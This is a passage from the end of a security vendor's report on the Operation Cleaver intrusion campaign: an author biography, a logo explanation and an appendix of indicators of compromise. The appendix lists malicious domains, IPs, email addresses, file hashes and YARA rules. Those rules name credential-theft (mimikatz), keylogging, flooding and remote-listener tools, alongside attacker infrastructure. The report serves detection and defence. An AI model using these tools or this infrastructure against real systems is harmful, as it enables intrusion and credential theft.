CEO/President and Chairman of Cylance. Widely recognized for his extensive and \nin-depth knowledge of security products, Stuart McClure is considered one of the industry’s leading \nauthorities in information security today. A well-published and acclaimed security visionary with \ncurrently eleven books in print, McClure is the originating founder of the Hacking Exposed  series \nof books, the most successful security book ever written. From his work, he founded Foundstone in \nOctober of 1999 which sold to McAfee in 2004.\nMcClure brings over two decades of technology and executive leadership with profound technical, \noperational, and ﬁnancial experience. Besides Foundstone, Stuart held leadership positions at \nInfoWorld, Ernst & Young, Kaiser Permanente and a number of government agencies. At McAfee, \nMcClure held numerous positions including SVP/General Manager for the Security Management BU \nas well as EVP/Global Chief Technology Officer responsible for almost $3B worth of revenues. \nToday, McClure is CEO of Cylance, a disruptive and innovative startup applying math to the problem \nof security. Cylance products such as CylancePROTECT prevent the most advanced attacks in the \nworld without signatures or sandboxing in realtime on the endpoint. Cylance Services offer highly \nspecialized security services such as incident response, forensics, compromise assessments and \nadvanced penetration assessments for global critical infrastructure.\nCylance Team\nCylance employees work passionately and tirelessly every day to achieve one goal: Protect the \nworld from cyber attacks. And with their efforts in tracking Operation Cleaver, they have achieved \nthat goal. Our endless thanks to all the Cylancers who contributed to this report. OPERATION\nCLEA VER\n72 5468696e6b204576696c2c20446f20476f6f64THE OPERATION CLEAVER LOGO\nThe Operation Cleaver logo, created by Cylance speciﬁcally for this report, was inspired by the \ninfamous logo used by the Army of the Guardians of the Islamic Revolution, also known in the \nwest as the Iranian Revolutionary Guard Corps (IRGC). Due to the close connection between the \nmembers tracked in this report and the IRGC, it was only ﬁtting to replicate the look and feel of the \nIRGC’s iconography as the anchor for this document’s branding.\nArmy of the Guardians of the \nIslamic Republic (IRGC)\nThe striking visual elements that make up the logo \nof the IRGC have very speciﬁc meanings:\n• The clenched ﬁst holding a riﬂe, most likely an \nAK-47, represents armed resistance.\n• The globe symbolizes the IRGC’s worldwide \nambitions.\n• The book, from which the clenched ﬁrst \nemanates, represents the Qur’an, connecting \nthe religious ideals on which the group was \nfounded to the armed struggle.\n• The plants, possibly wheat, represent \nprosperity.\n• The name of the group in Persian, the year in \nwhich it was founded and a passage from the \nQur’an (8:60) ‘And make ready against them all \nyou can of power’, are represented in text.\n5468696e6b204576696c2c20446f20476f6f64\nOperation Cleaver\nSeveral of the visual elements present in the IRGC \nlogo have been carried over to the Operation Cleaver \nlogo including:\n• A clenched ﬁst, this time holding a cleaver, \nrepresents the group’s likely connection with the \nIRGC as well as armed resistence in general.\n• The globe in the background represents \nOperation Cleaver’s worldwide reach.\n• An ethernet cable connected to the clenched ﬁrst \nrepresents the nature of these attacks (cyber as \nopposed to traditional warfare).\n• The hex string translates to “Think Evil, Do Good”, \na mantra our research team lives by.#OP CLEA VERAPPENDIX A:\nINDICATORS OF COMPROMISE5468696e6b204576696c2c20446f20476f6f64OPERATION\nCLEA VER\n74 5468696e6b204576696c2c20446f20476f6f64Indicators of Compromise (IOC)\nThis Appendix details the IOCs discovered in the investigation of Operation Cleaver. \nCylance PROTECT  prevents the malware used in Operation Cleaver from ever executing.\nDomains\ndoosan-job(dot)com\ndownloadsservers(dot)com\ndrivercenterupdate(dot)com\neasyresumecreatorpro(dot)com\ngoogleproductupdate(dot)com\ngoogleproductupdate(dot)net\nkundenpflege.menrad(dot)de\nmicrosoftactiveservices(dot)com\nmicrosoftmiddleast(dot)com\nmicrosoftonlineupdates(dot)com\nmicrosoftserverupdate(dot)com\nmicrosoftupdateserver(dot)net\nmicrosoftwindowsresources(dot)com\nmicrosoftwindowsupdate(dot)net\nnorthropgrumman(dot)net\nteledyne-jobs(dot)com\nwindowscentralupdate(dot)com\nwindowssecurityupdate(dot)com\nwindowsserverupdate(dot)com\nwindowsupdateserver(dot)com\nwww.gesunddurchsjahr(dot)de\nEmail Addresses Used for Domain Registration\ndavejsmith200(at)outlook.com\nsalman.ghazikhani(at)outlook.com\nbtr.8624(at)yahoo.com\nghanbarianco(at)gmail.com\nazlinux73(at)gmail.com\ndomain(at)netafraz.comtarh.andishan(at)yahoo.com\nahmadi(at)odeconline.com\nkafe0(at)yahoo.com\ndg_co(at)yahoo.com\nzahiry_alireza(at)yahoo.com\nzahiry.alireza(at)gmail.com#OP CLEA VER\n75\n5468696e6b204576696c2c20446f2ff0476f6f4\nEmail Addresses Used for Exﬁltration \ntestmail_00001(at)yahoo.com\nTerafficAnalyzer(at)yahoo.com\ndyanachear(at)beyondsys.com\nIP Addresses\n50.23.164.161\n64.120.128.154\n64.120.208.74\n64.120.208.75\n64.120.208.76\n64.120.208.78\n64.120.208.154\n66.96.252.198\n78.109.194.114\n80.243.182.149\n87.98.167.71\n87.98.167.85\n87.98.167.141\n88.150.214.162\n88.150.214.166\n88.150.214.168\n88.150.214.170\nMutexes\nZSC1\nAdobe Report Service\nBmgr\nDynamic Mutexes\nThese mutexes are used with the process ID of the malware as a suffix:\ndemdaramdidam\nILoveThisMutex95.211.191.225\n95.211.191.247\n95.211.241.249\n95.211.241.251\n108.175.152.230\n108.175.153.158\n159.253.144.209\n173.192.144.68\n174.36.195.158\n184.82.158.18\n184.82.181.48\n188.227.180.213\n192.111.145.197\n203.150.224.249\n207.182.142.68\n212.87.154.12\n212.87.154.14OPERATION\nCLEA VER\n76 5468696e6b204576696c2c20446f20476f6f64Installed Services Names\nCOM+ System Extentions\nCOM__System_Extentions\nNetwork Connectivity Manager\nService1\nMsNetMonitor\nPcapins\nscManagerSvc\nCredentialSync\nAdobe Report Service\nSamples (MD5)\nListed below are both the MD5 and SHA-256 hashes for samples related to Operation Cleaver.\n01606d42c64e4d15ea07d4e1fbd0c40d\n0405adfc8739025ba88c746c8edebfb8\n04fdf5b757764af8bc7ef88e0f8fe8c1\n0512c5a8807e4fdeb662e61d81cd1645\n0593352cadb2789c19c2660e02b2648b\n08eabb6164b1b12307931e4f2d95f7c6\n0900c3319e4c46ff9478e3e1fa9528a1\n0acd8945bd162e5e7aa982cddbd8ecaa\n0ad6a01a916f14fc24fa43e46813b3bb\n0b2cbfa07fa9a090b35a3dfdb0ebad9d\n0b80a8d2c56789b4bda9a56a53e7e2b1\n0f4b526d8edf1d3d32c81a692c325733\n10d019932fc43e9b39be709f8281203d\n1223e93dd4a5ad0536c8232936cb35fe\n144064951cceaf1bb81e8f215de76101\n14a80287490f3a68d99c0f518b246fd2\n17d1f25185b31044eb89a99d50d36a26\n18942a44d2b5f2bbf54e2c18ac293915\n18efd3f66d23c5c555e128a19de63667\n19d9b37d3acf3468887a4d41bf70e9aa\n1c2bc564805695dbb3a26d9c9f7dffea\n1c7e40443e36c4b7592617f0a271835d\n1d8fd8c357907a79f3e6d9f831f2bd7d\n21829130d5e2a69b0f6963c68b070127\n2e36a3f3b888c1fd3c3aa3f1ba7969ad\n30120cf30ea4d870635893cd75338f97\n304f7f17031af90012d4e4d1cc5cfb8a\n336b501bd96e309f93c8d12960634248\n38998ff6f9a3874b6943d7ac837d19c3#OP CLEA VER\n77\n5468696e6b204576696c2c20446f2ff0476f6f4\nSamples (MD5) cont.\n3b6260ead85b4f0d706203e062a34a21\n41eeae4158152f49ab64601c4358a7a1\n42714874f86fa9bd97e9be460d7d72c0\n42e459d1d057bd937e0d00958e591f08\n48dd515e2b148493cf47b0c0c5713573\n491f031d0a9ad4919cb29cb2d9a9a65c\n4e483762f555b078976a1ddf3fc3e532\n53230e7d5739091a6eb51298a50eb616\n537b42d3cd9812e5b583131b83a48508\n53841511791e4cac6f0768a9eb5def8a\n54def27d598b75f297a8cf2c97150997\n5837ad676f6c0f0f4f48096648d6e81b\n5a4046fd0825641766b197a2132d2410\n5e5d6469b270aa60dc90ddfde32ba082\n5eef1ee37714c9ee07653419890010d6\n6061410c04b9fa9e47593611a02ff2dd\n6094f64d54575a2d5a3fbd2d23c4f44e\n61896424e995476b23f73a5c1c34af5e\n61e307a651a7bbce78eb48c1d395501a\n636c2d2855ac8a8693c4ef9e89c67205\n641fc6831d8c215e9645cf5d4a8be5e5\n68cfc418c72b58b770bdccf19805703e\n69d80a27ab0c85ef073badbee7ec55c7\n69f9705ecdcc709506f7665ad373c1a0\n6cd5f1982693f2ce21effddf18f5baf5\n6d4d21258eef96979ce6f2417c6c019f\n6ef950941d114c09af359402620d7cba\n735cdf3a3e9c06d88de31112782ef831\n736aab6c731d098931d6a4bf11a8150e\n758f2557922e360bff3d1565e6871ea1\n765f3db4421bdf8bb953dffe37398453\n78a63bc8433cea162e31a5865d5817c9\n836ef6b06c5fd52ecc910a3e3408004a\n84384d77ac9835720375943235d33a87\n855239a2434a3bc78751d9ba9cfac900\n8994e16b14cde144a9cebdff685d8676\n9376e5b754ccd94f7c66b811d81e240e\n948c570269059928517f155b4b6db1a4\n94ef4f98b9c321f74778811f64c68d03\n96e372dea573714d34e394550059b1d7\n9838f7ead2023061eb79587243910daa\n985e86ac1854585d2771fd173b63b98bOPERATION\nCLEA VER\n78 5468696e6b204576696c2c20446f20476f6f64Samples (MD5) cont.\n9a48bee62c41c0640e9564cc37f718bf\n9bcb8091ba414a38bfb7a39eccf3f6bc\n9e00a52caec6385e0ab1e21e9794a5b0\n9ef9ec11c9f83dde38556feaf88b2a29\n9feee6fe54ee4ec859f7bad0d798ac4e\nad94daecadbac8a54e81a69cacc41441\nad99db10c0c12eaea09b39568a761b52\nadf77661a409b5a1304d08b62a1264f5\naf58d803b2e0b5d0f194c25ff85a8d81\nafdfafb2c1e2af1a48e833da8f35bb83\nb163fcda16d8fe860a906f768ef27bc8\nb2d78ecce135e008adc3e80915f69798\nb3d5e1ff7a7ff10cd738b215f92d1ad5\nb7ddb09bdc0d0eb39c364d9b9d6436cc\nbaa76a571329cdc4d7e98c398d80450c\nbd9fbbbd7dab62ed6a56d00f21c4c67e\nbe6273ebd472a2a499a6c1e48ae81112\nbe741520f13a2bf8bc064a73e146bf08\nbfc59f1f442686af73704eff6c0226f0\nc1b5464c0506bea6cf778dd18fa456cc\nc440ec0a8cf7341b746160a684c51741\nc5282f088b90de1ab758424b152d34ac\nc91887d861d9bd4a5872249b641bc9f9\ncb52f84d462ac67bde53eec40128408c\ncbe05db979444589211e830487df7610\nd000071a6bf49da390fef8f12aa9e3f8\nd84c3d678f269a0c6beb22ed266efac0\nde56ca66423fc5e42808445f2b5631d3\nde56ca66423fc5e42808445f2b5631d3\nde744bcb7c63b035b6c5c3ec0279c3ac\ne0f6c5fdde04fbf8cd1a42f75cb06248\ne4c9e8f28894e89d6270ad6a4c6cd064\ne4e5f1efe44ac06bc3672fd1d8f85630\ne5428bcae8b4e84cb5186ad5c83ffc98\ne7428dec7deb041692d6575e069c1cf0\ne8b1f23616f9d8493e8a1bf0ca0f512a\ne8ea10d5cde2e8661e9512fb684c4c98\neac61634da4513a10b596e6c8c299126\neb48c318e8fd9a2a7a18da6578db05d6\nf1301bad6da06f436e3a3de0244848e1\nf3d80d813dc6a239d921169c57c5789d\nfa7c9a78eda0f3bb9ff8ec827d5bc9ff#OP CLEA VER\n79\n5468696e6b204576696c2c20446f2ff0476f6f4\nSamples (SHA-256)\n039ce41fb40a27a46c43bf7ef7d1b08cd5e3f6d71ec08e140cd9166247e783af\n0510efd8eae869cd0773a033d5a46d6b7f0162174019e54618887f3085312fcb\n064e47074342a6e026de068adaf48c41b2ec2c341c7514768cb7b39425905524\n08065f658d65773e583e9ca784148117d87be3a5005a0871cbc4446f42ed5040\n0ce968ea8cffb6312f6d17af9044a14f79d6427b9038bcfc6212acb5aa23e74b\n0d1f479842cd5bde4f18ab8c85a099da39e13a4051a7c21334e33d55b6f18d76\n0fee562cd821f53e864e02b00a59780aed63abca9f7502678fca9bf47b8b12bd\n10647c4e7b1b741aeaea9b16d8eb5dae3237ce00dc69f6843790767a277b6204\n10cf7a186897243363278cf0283a1687749d9ba43fa713b9f974050f56e97cca\n15121b7cbd15143fc0118e06ebe70b7dc1e239b21d865b2c750ed8a0f1f00ef2\n1578a4c641f0c7913cdf08267d1a88ac384d586c453b922670be380b7e67a179\n1698d8168e860c3377646b12444d38a2e6aebba5a499504a5fc0a73b91d89407\n1756ba79cd63458a50df86203380824ea855c8d6bf1c673e05a13a62f14cd170\n1aa25a930e8bae5abbe75907c335c7d1d875b60f72f02855a8d37daadc6b469f\n1efad3bce90ac1d2011ba686f1ab0e435b9a709763fb238dbcad0f44acddccbe\n20dddd8651a26161139b49dfabfb3b4b743c57fcc982afc11d1c5c4264a2a8be\n2a13730f8f16e04cece490eee53bbdcc9bd1e01fbbc2a758562a6462d9473742\n2db6f74a8aef9fe86aef5dff3334e8dd252ac45e26b4a12e8641a770bbb08b45\n2e32c6c9179750df7f1ab35536f09c6b09c73faccea7325fe5c79b5087f5dd6f\n32aa8f19e452a1471640cd7be72f806e1997fd5a1a2b2743898ee4cd0aed0dc5\n37af3f3b3c43690a2e73d4b5edb968896ec4da7b2c21b12a94e146a10f07fef8\n39ba1710545fc9e123abbbce61bda1b00525e59346570a3f8c36f7adde5bb47e\n3a7ebd7f502fd3f6b3b88693b1123147621b4030c21df9e0690864e8969e149a\n3bdbf591fa0d81606929fdf6abe44ba6e185dd8fc0fa62ade8afde48f704d11a\n3d18e18ae97045cc3198026ddc681e7d957a25402b79141a3c6fdc18bb879ad6\n3fa302449da1e4fad81143cc48fc80034cbc41804f00e00ac17bdb7dba0b992d\n42ca980b7fc7892716a923c7bf3ff6a76ce81f81bd0a83bea40a1735f33b36b8\n45a2ea5226c1ce11e8955c99d5b58fd3baa66fb53436be63cb099e96ef30db43\n48437fe7d7d0c5fbde340e1392662f7fc421fc05d7c9824f71160475105ad999\n4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1\n508c7691d535102538aaa6dce32d750c2492dada36506a390c1959f261a0244b\n50d11ad32eb72b128185a0aecf39be8085b6b1a8f30cb41d8bc177a1ff8f3067\n550a33353730579a7d2b9276cc3b66ca252a59e198285c732fcda46513351c03\n5ac9f4e25ef4002274496e18ea537b4c582a3acf3126cc1830a63941d9c91e64\n5d1e81f5a4fca25b7afb18eb906c9a53965d81dcf62f9d91499baf03229a8de8\n5fb4ae33cac8b2b74e63fc639eeb969a660ef9a7e8310c2769acc925122f047e\n616a25378f70474bcb3ad0fad2f1383009c5b7b3cea937be2a5234a110d64b78\n634685e43e9f73343cb337ec64a8679485e1ddb4c2de5ecb6a5746aa5ddb1b72\n6474f74340e7199919e7532c6756cf459cd20c3391852d80b058eb7997a31e9f\n650f143ac0a668536b6750a628ec51e7ca28f5520105eeb87308f557cd74e63c\n65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976OPERATION\nCLEA VER\n80 5468696e6b204576696c2c20446f20476f6f64Samples (SHA-256) cont.\n65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976\n67a2b9c32653161fafaea231b6661d9d797bb0964c79c9ee46cf2bf76571ed45\n6888723e56f2e7696ac1e1910f68a1d54d7c76e9eb8e69554980b04e881e0e86\n7199acca3d851889efa4a5a42b3f55010f4916294201ce5ad20c76898200ffa9\n75b77606175ee696395f1b0e6850d5cd6596e34f74804b30c9bf9e368ebcd299\n7890a726603edcd70b6e6f3de367cf891131d833d14c506b26e07935a715048f\n79ca080a152bd44f9b07af0f940c303e45e10d516633384f5b3d34a29d0d03c8\n7b9fd4b9b36cf84fcbcb3e9bf589d8a51c2166558baf462ab312929fbb584642\n80ed4e7a242ee3d1c2656affb04cd56e7262e5a6bf2bec2f8435aa3f47c9b5d1\n8129345ce66643d880a3e01e607399279dec7bf9cadc06d9b26134f6d205ed06\n8813bd0b4ad6c6155b571c9c1fbcabfeed3812ab8fbd9acd8372385094aaa565\n8f02dfd900760cb2c84e4f5a859512f5d719daae063a719c956cbf6185004da5\n8f9a45ba73c67ba9c4958ea49508c350a0e1c3caf476ccab2fb8cb3049e3ba46\n902f2391b1075e14985bc91316c98cdcf3442ecaeb3ef12422813f946ab8409e\n9801f7c552cbcf8c413dade920b96be2eaad9624ba4adaf17f80f815dac58974\n9aec3f14ec69e9942a7d3075bb5479dc5fa61e6c2a03cbee1a9269264efac51c\n9ba06cb9dcd05e6866ee0e9ecc0c9a480d5b6c8d177ef1907d7fcc02e2871806\n9ebbd300ddf70bccbecfe3bf47898e5959cfc090cef8716e2e638d840a24007b\na321158d7f5be572ac5536ad57cb4a312bea52430b03da9dda97f4548a080bc3\naa23c55bed562cbf47c84092d0a35b0da35e3db3982a18a28fb45ca70ac6b399\naa7ac2a053ceba819fcd1c8b273db64296c2754a8101291870e142519c416b1b\nabb0ebd57cf2b0d54cd2b01fd9b11ccd9ed68053174d131922811a9ad22459ea\nac272bd9701c5d9cb7e8d1a4e2a191a894e98aa463fb17628c52da16612627d8\nad06e03fdd9eff480ca623ea23ec87c794d99ae6dda308c979fa5173b2b8a514\nad5fbf8e381d92225aa6c022e2bbc175be0e33138b5fa4bbb508b970b33bbc1e\nad71283aadb2455f7a1cd4e8283c789599c33d328da44965f6c282f2e600e1b2\naebac79b820891510b9e14ef97892875bf4197797ca91aef149acdc1e6bf6a7c\naf8deedc78097c387926bb95ebd6ab2a870349794f452f35f84132b0dbe12e09\nb18f80a02d45eaed618993447c82916ad8802e552dddccf733a3698794d8cb9d\nb275caf4cbc4f47b3d772886172438b81a2e11ff5a8683be488de4b219b39070\nb42ef5f39aaf6e52ff4e0510b6e5c3fb5c84bf35befcde8bcc18dc86bccbdfb4\nb49706b7d5432a368070ee58aa8776cce1ddc2098e863b1b7b36d7b7d79fe6a9\nb4d4c421bc70e5a3345d4b8c9d1090ff16ff82870bd38216bb8bac7f1088dafb\nb99cddd428e78ede109c7bd3683c374ac6010a15c0633939511e39c1ed99f621\nbb2b135c7a9b366ec7090404761a9ee9e7c03c56d68165a6789a29e804104068\nbe4cc2d1504002107a77bb943ad2d22c205cdcc6ad4804c0440970e5e922d30d\nbf7746d29330b666d82b153989d41406305572b92f6b24a1f1adef6374b58328\nbfa66edd0d9ae2c8179893ee881f479b37dce0ce8220a8a18e1b42a879ddff4a\nc11a244cba9da30173ff1dcb755a377c3b2b1f99cd15a887041937b086113ebd\nc1c1e5b43b1ac9af79aafa59a6062468142afc2278b6fea0bb4dbbb83af65d06#OP CLEA VER\n81\n5468696e6b204576696c2c20446f2ff0476f6f4\nSamples (SHA-256) cont.\nc30a2fe22050dcac30616a3d27d5c92ea2815d060b365747984913758a209aaa\nc74df42cfc7c7221f7f28c67bd726a1caad8453fc35daddfb094aaeede2e8e1e\nc9010e060de6a83c3802ed4e6b7f544e6eb2b5420ee2be5c71646e6a27182bea\nc901d84878f50a93ab76f2ea31763bebb0acf0c0f9ad86b3abf98e5cde499332\nc99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69\nc9fc8133e755c14cb02872ba05a2332baefe5e94797479aded46c3db83a7cc14\nca7138bfe08b480386653072482e58f6c48b05a1e7fb8a82cc042806eae9acc2\ncaa769a21bf97987de4cc92874eaa03e7b0538082c502606aa8ca97823e2e2aa\ncd75664edea18e3aa303763e6f6c639b3e90ead4b51c2b3e41c808e3d968c848\ncffba2a145d91bdecfa8cb32af6964576889faa04591b503a58507cf89ab7cae\nd045ea925cf461da5c58cc2af8a0f96ec7c961ea62ffcf1de0b04abf9b0fa8ac\nd11b504b18bc8615e98f3c37d98c6fe11216a0f070a056414ca4407fc298fbd6\nd3c2488d321ca6760986fc1a55a3c1db3f7b215fc2883d7e4fabc2871b5a27ac\nd4e54c1bc1efba20d75861c01bb2cc053b1ab9fadae29bf6c4c04528110056e6\nd5d1fa5b5474089e59c05ca88a96257d4449d852b429c620aa773408bd48d067\nd8c7aef47bac024188d929e749e90ac172fd51b8f6e16dec4b6635dc2ffa85ef\ndc21a2189f9e2d63872c0b5ee7ec75316799c60eb018ba9b98398b69efe45365\ndc22e4b5ef752d3ec47d7bb3de7534e4a2daa2642de8c9839ad262d33a7aa7dc\ne180f933aad709883acde441ee64407d49fa4183ae5130480005a0e81a0de491\ne250bce96e5f0c162dbe4d87a1a7d65deb910f59c0bea1140897c22eb9dca501\ne2e9d60c76225db77668440ff698eacef48b544ffab1ae0c641dcedb5ad570bd\ne339c7b77113f1a1c4c2f7e307b785cc4fc9145663fe3a612079240efcc9ac93\ne3b38627d9e94a7e084e12cbd2acf7e66ce90021972061f8b9b61316eddb3bd6\ne401340020688cdd0f5051b7553815eee6bc04a5a962900883f1b3676bf1de53\ne4d43cd20d4ea59f68c26d46c30e1819cac5b9552d27fce826b0855494018267\ne509843b2c061fa5e6ea7d11554bb22f36e6b79b7cd5cc0639ff63d48ce66336\ned85c3f8d2cccbb6a0ec2b4b27b158b4dbc6885245081901dd51eb2266f4b2bf\nee33dd17802ca906fcc68815ff2a7d12ac7fab7f1c272a56444e4fd6715a6227\neea0dcabaabef075081e23fc91b84e07042117bb0362e59f11b17338108d0c1b\nf7e1a74e08c5718de9edc57facc26dda97ae5b723420a06ef56f1f6f8aa6fb5a\nfbc531e83359310e2940ffff180a26e28d55396710c748e2ae7e64357273a09d\nfd4a9af7ba67f794a83a720539666e89f288686a432b5c7133033a2ebde266cc\nPublic/Private Key Fingerprints\n0A:E1:AE:85:6A:BB:D5:87:BF:8E:21:4E:92:E6:1F:8C\n70:70:2F:11:2B:01:03:4A:70:D9:5E:11:CC:E9:7A:16\n6F:DB:BB:BA:DA:7F:FA:4B:3F:A1:C3:46:5E:4B:8F:31:E8:31:F1:EC\n78:BE:02:06:B3:1E:57:DF:62:4E:30:16:ED:AA:5C:56:F7:E8:11:62OPERATION\nCLEA VER\n82 5468696e6b204576696c2c20446f20476f6f64YARA Signatures\nrule BackDoorLogger\n{\n  strings:\n    $s1 = “BackDoorLogger”\n    $s2 = “zhuAddress”\n  condition:\n    all of them\n}\nrule Jasus\n{\n  strings:\n    $s1 = “pcap_dump_open”\n    $s2 = “Resolving IPs to poison...”\n    $s3 = “WARNNING: Gateway IP can not be found”\n  condition:\n    all of them\n}\nrule LoggerModule\n{\n  strings:\n    $s1 = “%s-%02d%02d%02d%02d%02d.r”\n    $s2 = “C:\\\\Users\\\\%s\\\\AppData\\\\Cookies\\\\”\n  condition:\n    all of them\n}\nrule NetC\n{\n  strings:\n    $s1 = “NetC.exe” wide\n    $s2 = “Net Service”\n  condition:\n    all of them\n}\nrule ShellCreator2\n{\n  strings:\n    $s1 = “ShellCreator2.Properties”\n    $s2 = “set_IV”\n  condition:\n    all of them\n}#OP CLEA VER\n83\n5468696e6b204576696c2c20446f2ff0476f6f4\nYARA Signatures (cont.)\nrule SmartCopy2\n{\n  strings:\n    $s1 = “SmartCopy2.Properties”\n    $s2 = “ZhuFrameWork”\n  condition:\n    all of them\n}\nrule SynFlooder\n{\n  strings:\n    $s1 = “Unable to resolve [ %s ]. ErrorCode %d”\n    $s2 = “your target’s IP is : %s”\n    $s3 = “Raw TCP Socket Created successfully.”\n  condition:\n    all of them\n}\nrule TinyZBot\n{\n  strings:\n    $s1 = “NetScp” wide\n    $s2 = “TinyZBot.Properties.Resources.resources”\n    $s3 = “Aoao WaterMark”\n    $s4 = “Run_a_exe”\n    $s5 = “netscp.exe”\n    $s6 = “get_MainModule_WebReference_DefaultWS”\n    $s7 = “remove_CheckFileMD5Completed”\n    $s8 = “http://tempuri.org/”\n    $s9 = “Zhoupin_Cleaver”\n  condition:\n    ($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or \n$s9)\n}\nrule ZhoupinExploitCrew\n{\n  strings:\n    $s1 = “zhoupin exploit crew” nocase\n    $s2 = “zhopin exploit crew” nocase\n  condition:\n    1 of them\n}OPERATION\nCLEA VER\n84 5468696e6b204576696c2c20446f20476f6f64YARA Signatures (cont.)\nrule antivirusdetector\n{\n strings:\n  $s1 = “getShadyProcess”\n  $s2 = “getSystemAntiviruses”\n  $s3 = “AntiVirusDetector”\n condition:\n  all of them\n}\nrule csext\n{\n  strings:\n    $s1 = “COM+ System Extentions”\n    $s2 = “csext.exe”\n    $s3 = “COM_Extentions_bin”\n  condition:\n    all of them\n}\nrule kagent\n{\n  strings:\n    $s1 = “kill command is in last machine, going back”\n    $s2 = “message data length in B64: %d Bytes”\n  condition:\n    all of them\n}\nrule mimikatzWrapper\n{\n  strings:\n    $s1 = “mimikatzWrapper”\n    $s2 = “get_mimikatz”\n  condition:\n    all of them\n}\nrule pvz_in\n{\n  strings:\n    $s1 = “LAST_TIME=00/00/0000:00:00PM$”\n    $s2 = “if %%ERRORLEVEL%% == 1 GOTO line”\n  condition:\n    all of them\n}#OP CLEA VER\n85\n5468696e6b204576696c2c20446f2ff0476f6f4\nYARA Signatures (cont.)\nrule pvz_out\n{\n  strings:\n    $s1 = “Network Connectivity Module” wide\n    $s2 = “OSPPSVC” wide\n  condition:\n    all of them\n}\nrule wndTest\n{\n  strings:\n    $s1 = “[Alt]” wide\n    $s2 = “<< %s >>:” wide\n    $s3 = “Content-Disposition: inline; comp=%s; account=%s; product=%d;”\n  condition:\n    all of them\n}\nrule zhCat\n{\n  strings:\n    $s1 = “zhCat -l -h -tp 1234”\n    $s2 = “ABC ( A Big Company )” wide\n  condition:\n    all of them\n}\nrule zhLookUp\n{\n  strings:\n    $s1 = “zhLookUp.Properties”\n  condition:\n    all of them\n}\nrule zhmimikatz\n{\n  strings:\n    $s1 = “MimikatzRunner”\n    $s2 = “zhmimikatz”\n  condition:\n    all of them\n}OPERATION\nCLEA VER\n86 5468696e6b204576696c2c20446f20476f6f64\n#OP CLEA VER5468696e6b204576696c2c20446f20476f6f64"
}